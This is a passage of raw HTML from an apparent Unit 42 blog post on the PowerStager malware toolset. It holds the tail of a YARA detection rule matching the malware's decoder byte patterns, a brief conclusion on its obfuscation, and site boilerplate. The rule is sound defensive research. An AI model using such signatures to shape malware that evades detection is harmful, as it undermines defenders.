class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-i">D0</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-i">B6</span><span class="crayon-h"> </span><span class="crayon-cn">18</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">4D</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-22"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">decoder_x86_02</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-h"> </span><span class="crayon-i">C8</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-i">B6</span><span class="crayon-h"> </span><span class="crayon-cn">84</span><span class="crayon-h"> </span><span class="crayon-cn">05</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-i">C3</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-h"> </span><span class="crayon-i">D9</span><span class="crayon-h"> </span><span class="crayon-cn">8D</span><span class="crayon-h"> </span><span class="crayon-cn">95</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-i">D0</span><span class="crayon-h"> </span><span class="crayon-cn">88</span><span class="crayon-h"> </span><span class="crayon-cn">08</span><span class="crayon-h"> </span><span class="crayon-cn">83</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">3D</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-23"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">decoder_x64_01</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-cn">98</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">7</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-cn">63</span><span class="crayon-h"> </span><span class="crayon-i">C8</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-24"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">decoder_x64_02</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-i">B6</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">3</span><span class="crayon-o">-</span><span class="crayon-cn">6</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-h"> </span><span class="crayon-i">C2</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-i">C2</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-cn">98</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">condition</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-26"><span class="crayon-h">	</span><span class="crayon-e">uint16be</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">0x4D5A</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-27"><span class="crayon-h">	&nbsp;&nbsp;</span><span class="crayon-st">and</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-28"><span class="crayon-h">	</span><span class="crayon-e">all </span><span class="crayon-e">of</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e ">apicall_*</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-29"><span class="crayon-h">	&nbsp;&nbsp;</span><span class="crayon-st">and</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-30"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-e">filename</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-31"><span class="crayon-e">	&nbsp;&nbsp;</span><span class="crayon-st">and</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-32"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-e">pathname</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-33"><span class="crayon-e">	&nbsp;&nbsp;</span><span class="crayon-st">and</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-34"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-e">filedesc</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-35"><span class="crayon-e">	&nbsp;&nbsp;</span><span class="crayon-st">and</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-36"><span class="crayon-h">	</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">of</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e ">decoder_x86*</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">of</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e ">decoder_x64*</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-37"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0023 seconds] -->
+<p><span style="font-size: 18pt;">Conclusion</span><br />
+While it’s not the most advanced toolset out there, the author has gone through a lot of trouble in attempting to obfuscate and make dynamic detection more difficult. As I mentioned previously, PowerStager has covered a lot of the bases in obfuscation and flexibility well, but it hasn’t seen too much usage as of yet; however, it is on the rise and another tool to keep an eye on as it develops.<br />
+Palo Alto Networks currently tracks PowerStager in AutoFocus via the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.PowerStager">PowerStager</a> tag. Wildfire has been updated with new signatures to ensure protection against these executables. The YARA file, PE meta data, and a list of hashes related to this tool, can be found on the Unit 42 <a href="https://github.com/pan-unit42/iocs/tree/master/powerstager">GitHub</a>.<br />
+&nbsp;</p>
+          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
+  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
+  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
+  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
+  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
+    <input type="hidden" value="1086" name="formid">
+    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
+    <input type="hidden" value="531-OCS-018" name="munchkinId">
+    <input type="hidden" value="2141" name="lpId">
+    <input type="hidden" value="1086" name="formVid">
+    <input type="hidden" name="mkto_optinunit42" value="true">
+    <input type="hidden" name="mkto_opt-in" value="true">
+    <div class="row">
+      <div class="col-sm col-12 mb-sm-0 mb-15">
+        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
+        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
+      </div>
+      <div class="col-sm-auto col-12">
+          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
+      </div>
+    </div>
+
+    <div class="google-recapth mt-15">
+      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
+      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
+    </div>
+  </form>
+
+  <div class="font-size-ex-sm col-sm-7 p-0">
+    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
+  </div>
+</div>
+
+<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
+        </div>
+      </div>
+    </div>
+  </article>
+<footer class="site-footer px-sm-0 px-15">
+  <div class="pt-40">
+    <div class="container pt-sm-30">
+      <div class="row justify-content-lg-center">
+        <div class="col-lg-11 col-12">
+          <div class="row">
+            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
+              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
+                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
+                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
+              </nav>
+            </div>
+
+            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
+              <div class="row">
+                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
+<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
+<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
+<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
+<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
+<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
+</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
+<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
+<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
+</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
+<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
+<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
+</ul></div></div>              </div>
+            </div>
+          </div>
+
+          
+            <div class="copyrights py-25 mt-40">
+               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+    <script type="text/javascript">
+	var isProcessing = false; 
+    function alter_ul_post_values(obj,post_id,ul_type){
+	
+		if (isProcessing)    
+		return;  
+		isProcessing = true;   
+		
+		jQuery(obj).find("span").html("..");
+                jQuery.ajax({
+                    type: "POST",
+                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
+                    data: "post_id="+post_id+"&up_type="+ul_type,
+                    success: function(msg){
+                            jQuery(obj).find("span").html(msg);
+                            isProcessing = false; 
+                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
+                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
+                    }
+ 		});
+	}
+	</script>
+            <script type="text/javascript">
+            (function(){
+                document.addEventListener('DOMContentLoaded', function(){
+                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');
+
+                    if ( wpp_widgets ) {
+                        for (let i = 0; i < wpp_widgets.length; i++) {
+                            let wpp_widget = wpp_widgets[i];
+                            WordPressPopularPosts.theme(wpp_widget);
+                        }
+                    }
+                });
+            })();
+        </script>
+                <script>
+            var WPPImageObserver = null;
+
+            function wpp_load_img(img) {
+                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
+                    return;
+
+                img.src = img.dataset.imgSrc;
+
+                if ( 'imgSrcset' in img.dataset ) {
+                    img.srcset = img.dataset.imgSrcset;
+                    img.removeAttribute('data-img-srcset');
+                }
+
+                img.classList.remove('wpp-lazyload');
+                img.removeAttribute('data-img-src');
+                img.classList.add('wpp-lazyloaded');
+            }
+
+            function wpp_observe_imgs(){
+                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
+                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');
+
+                if ( wpp_images.length || wpp_widgets.length ) {
+                    if ( 'IntersectionObserver' in window ) {
+                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
+                            entries.forEach(function(entry) {
+                                if (entry.isIntersecting) {
+                                    let img = entry.target;
+                                    wpp_load_img(img);
+                                    WPPImageObserver.unobserve(img);
+                                }
+                            });
+                        });
+
+                        if ( wpp_images.length ) {
+                            wpp_images.forEach(function(image) {
+                                WPPImageObserver.observe(image);
+                            });
+                        }
+
+                        if ( wpp_widgets.length ) {
+                            for (var i = 0; i < wpp_widgets.length; i++) {
+                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');
+
+                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
+                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
+                                }
+
+                                if ( wpp_widget_images.length ) {
+                                    wpp_widget_images.forEach(function(image) {
+                                        WPPImageObserver.observe(image);
+                                    });
+                                }
+                            }
+                        }
+                    } /** Fallback for older browsers */
+                    else {
+                        if ( wpp_images.length ) {
+                            for (var i = 0; i < wpp_images.length; i++) {
+                                wpp_load_img(wpp_images[i]);
+                                wpp_images[i].classList.remove('wpp-lazyloaded');
+                            }
+                        }
+
+                        if ( wpp_widgets.length ) {
+                            for (var j = 0; j < wpp_widgets.length; j++) {
+                                let wpp_widget = wpp_widgets[j],
+                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');
+
+                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
+                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
+                                }
+
+                                if ( wpp_widget_images.length ) {
+                                    for (var k = 0; k < wpp_widget_images.length; k++) {
+                                        wpp_load_img(wpp_widget_images[k]);
+                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            document.addEventListener('DOMContentLoaded', function() {
+                wpp_observe_imgs();
+
+                // When an ajaxified WPP widget loads,
+                // Lazy load its images
+                document.addEventListener('wpp-onload', function(){
+                    wpp_observe_imgs();
+                });
+            });
+        </script>
+        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
+          
+  </body>
+</html>
